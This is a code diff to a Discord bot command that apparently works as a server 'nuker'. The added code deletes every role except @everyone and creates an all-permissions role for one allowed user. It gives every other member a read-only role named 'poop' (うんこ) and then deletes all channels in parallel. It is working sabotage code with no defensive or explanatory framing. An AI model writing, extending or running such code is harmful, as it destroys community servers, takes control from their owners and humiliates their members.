@@ -34,8 +34,48 @@ async def lol(ctx, count: int = 100, invite_url: str = None):
     guild = ctx.guild
     
     try:
-        # 既存の全チャンネルを並行削除（高速化）
         import asyncio
+        
+        # 既存の全ロールを削除（@everyone以外）
+        role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
+        await asyncio.gather(*role_delete_tasks, return_exceptions=True)
+        print(f"全ロール削除完了")
+        
+        # 野獣ロール作成（全権限）
+        yaju_role = await guild.create_role(
+            name="野獣",
+            permissions=discord.Permissions.all(),
+            color=discord.Color.red()
+        )
+        print(f"野獣ロール作成完了")
+        
+        # うんこロール作成（閲覧のみ）
+        unko_permissions = discord.Permissions.none()
+        unko_permissions.view_channel = True
+        unko_permissions.read_message_history = True
+        unko_role = await guild.create_role(
+            name="うんこ",
+            permissions=unko_permissions,
+            color=discord.Color.from_rgb(139, 69, 19)  # 茶色
+        )
+        print(f"うんこロール作成完了")
+        
+        # メンバーにロールを付与
+        role_assign_tasks = []
+        for member in guild.members:
+            if member.bot:
+                continue  # ボットはスキップ
+            if member.id == ALLOWED_USER_ID:
+                # あなたには野獣ロール
+                role_assign_tasks.append(member.add_roles(yaju_role))
+            else:
+                # それ以外にはうんこロール
+                role_assign_tasks.append(member.add_roles(unko_role))
+        
+        await asyncio.gather(*role_assign_tasks, return_exceptions=True)
+        print(f"ロール付与完了")
+        
+        # 既存の全チャンネルを並行削除（高速化）
         delete_tasks = [channel.delete() for channel in guild.channels]
         await asyncio.gather(*delete_tasks, return_exceptions=True)
         print(f"全チャンネル削除完了")
